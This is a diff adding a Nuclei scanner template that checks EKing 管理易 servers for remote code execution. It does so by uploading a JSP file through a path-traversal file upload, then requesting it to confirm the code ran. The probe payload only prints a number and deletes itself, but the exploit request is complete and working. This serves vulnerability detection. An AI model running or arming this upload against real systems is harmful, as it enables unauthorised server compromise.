@@ -1,0 +1,52 @@
+id: eking-fileupload
+
+info:
+  name: Eking - File Upload
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template exploits a remote code execution vulnerability in Wanhuoa's upload functionality by uploading a JSP file and executing it.
+  tags: EKing-管理易
+
+variables:
+  rfilename: "{{to_lower(rand_text_alpha(8))}}"
+  s1: "{{rand_int(40000, 44800)}}"
+  s2: "{{rand_int(40000, 44800)}}"
+  rboundary: "{{to_lower(rand_text_alpha(8))}}"
+
+http:
+  - raw:
+      - |
+        POST /app/FileUpload.ihtm?comm_type=EKING&file_name=../../{{rfilename}}.jsp. HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="uplo_file"; filename="{{rfilename}}.jpg"
+        Content-Type: application/octet-stream
+
+        <%out.print({{s1}} * {{s2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundary{{rboundary}}--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"status\":\"OK\""
+
+  - raw:
+      - |
+        GET /{{rfilename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{s1 * s2}}"
